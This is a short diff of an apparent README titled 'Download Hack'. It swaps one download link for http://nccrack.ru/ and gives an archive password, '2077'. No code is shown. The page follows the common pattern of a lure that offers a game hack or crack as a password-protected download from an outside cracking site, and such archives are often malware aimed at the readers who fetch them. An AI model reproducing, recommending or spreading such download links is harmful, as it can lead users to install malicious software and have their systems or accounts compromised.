@@ -4,8 +4,9 @@
 
 # Download Hack
 
-<a href="mail.rambler.ru" target="_blank">DOWNLOAD</a>
+|[Download](http://nccrack.ru/)|
 |:-------------|
+
 Passwrod: `2077`
 
 -----------------------------------------------------------------------------------------------------------------------
